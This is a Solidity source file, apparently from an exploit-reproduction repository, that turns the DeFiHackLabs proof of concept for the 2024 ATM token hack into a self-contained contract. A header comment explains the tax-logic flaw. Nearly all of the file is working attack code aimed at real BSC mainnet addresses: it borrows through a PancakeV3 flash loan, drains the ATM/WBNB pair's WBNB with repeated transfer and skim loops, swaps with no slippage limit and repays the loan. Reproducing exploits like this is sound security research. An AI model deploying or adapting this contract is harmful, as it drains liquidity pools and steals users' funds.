// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the 2024-04-ATM PoC. The original DeFiHackLabs
// Foundry test (test/ATM_exp.sol) runs the whole attack INLINE on the test
// contract itself (the PancakeV3 flash callback `pancakeV3FlashCallback` lives
// on `ContractTest`), so there is no standalone exploit contract to deploy.
// This file faithfully copies that inline attack into a self-contained
// contract with a `run()` entrypoint, per the syntheticExploit pattern
// (see docs/EVM-playground-2.md §3 "syntheticExploit").
//
// Root cause (see ATM_exp.md): ATM's tax/auto-distribute logic treats any raw
// ERC20 transfer to the ATM/WBNB pair as a "sell" and force-dumps the
// contract's own ATM balance via swapExactTokensForTokensSupportingFeeOnTransferTokens
// with amountOutMin = 0. A flash-loan-funded attacker sandwiches those
// unslipped swaps and repeatedly transfer()+skim()s to drain the pair's WBNB.

interface IERC20Min {
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniPairV3Flash {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniPairV2Skim {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function skim(address to) external;
}

interface IUniRouterV2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract ATMDrain {
    IERC20Min constant WBNB = IERC20Min(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IUniPairV3Flash constant pool = IUniPairV3Flash(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    IUniPairV2Skim constant wbnb_atm = IUniPairV2Skim(0x1F5b26DCC6721c21b9c156Bf6eF68f51c0D075b7);
    IUniRouterV2 constant router = IUniRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20Min constant USDT = IERC20Min(0x55d398326f99059fF775485246999027B3197955);
    IERC20Min constant ATM = IERC20Min(0xa5957E0E2565dc93880da7be32AbCBdF55788888);

    uint256 borrow_amount;

    /// @notice Entrypoint (mirrors testExploit()).
    function run() external {
        borrow_amount = WBNB.balanceOf(address(pool)) - 1e18;
        pool.flash(address(this), 0, borrow_amount, "");
        // WBNB.balanceOf(address(this)) here is the final attacker profit.
    }

    /// @notice PancakeV3 flash-loan callback (mirrors pancakeV3FlashCallback).
    function pancakeV3FlashCallback(uint256, /*fee0*/ uint256, /*fee1*/ bytes memory /*data*/ ) public {
        uint256 i = 0;
        uint256 j = 0;
        swap_token_to_token(address(WBNB), address(USDT), WBNB.balanceOf(address(this)) - 170 ether);
        while (j < 2) {
            swap_token_to_token(address(WBNB), address(ATM), 70 ether);
            while (i < 100) {
                uint256 pair_wbnb = WBNB.balanceOf(address(wbnb_atm));
                ATM.transfer(address(wbnb_atm), ATM.balanceOf(address(this)));
                wbnb_atm.skim(address(this));
                (, uint256 wbnb_r,) = wbnb_atm.getReserves();
                uint256 pair_lost = (pair_wbnb - wbnb_r) / 1e18;
                if (pair_lost == 7) {
                    break;
                }
                i++;
            }
            j++;
        }
        // To get max profit, not good at math so just copy the exploiter's work
        i = 0;
        while (i < 15) {
            uint256 pair_wbnb = WBNB.balanceOf(address(wbnb_atm));
            ATM.transfer(address(wbnb_atm), ATM.balanceOf(address(this)));
            wbnb_atm.skim(address(this));
            (, uint256 wbnb_r,) = wbnb_atm.getReserves();
            uint256 pair_lost = (pair_wbnb - wbnb_r) / 1e18;
            if (pair_lost == 0) {
                break;
            }
            i++;
        }
        swap_token_to_token(address(ATM), address(WBNB), ATM.balanceOf(address(this)));
        swap_token_to_token(address(USDT), address(WBNB), USDT.balanceOf(address(this)));
        WBNB.transfer(address(pool), borrow_amount * 10_000 / 9975 + 1000);
    }

    function swap_token_to_token(address a, address b, uint256 amount) internal {
        IERC20Min(a).approve(address(router), amount);
        address[] memory path = new address[](2);
        path[0] = a;
        path[1] = b;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }
}
